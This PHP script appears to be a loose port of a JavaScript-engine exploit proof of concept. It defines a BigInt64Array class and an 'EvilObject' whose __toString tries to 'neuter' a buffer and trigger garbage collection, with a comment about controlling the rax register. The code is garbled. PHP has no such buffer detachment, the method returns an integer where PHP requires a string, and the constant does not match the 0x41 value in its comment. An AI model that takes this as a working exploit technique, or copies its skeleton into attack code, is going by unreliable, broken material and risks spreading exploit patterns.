<?php

class BigInt64Array {
  private $buffer;

  public function __construct($size) {
    $this->buffer = str_repeat("\0", $size * 8);
  }

  public function getBuffer() {
    return $this->buffer;
  }

  public static function of($array, $evil_object) {
    return call_user_func_array(array($evil_object, '__toString'), array($array->getBuffer()));
  }
}

class EvilObject {
  public function __toString() {
    // equivalent of %ArrayBufferNeuter(array.buffer);
    $buffer = str_split(unpack('H*', $GLOBALS['array']->getBuffer())[1], 1);
    array_walk($buffer, function(&$v) { $v = 0; });
    gc_collect_cycles();
    return 71748523475265 - 16; // rax: 0x41414141414141
  }
}

$evil_object = new EvilObject();

$GLOBALS['array'] = new BigInt64Array(11);

$GLOBALS['root'] = BigInt64Array::of($GLOBALS['array'], $evil_object);

gc_collect_cycles(); // trigger

?>
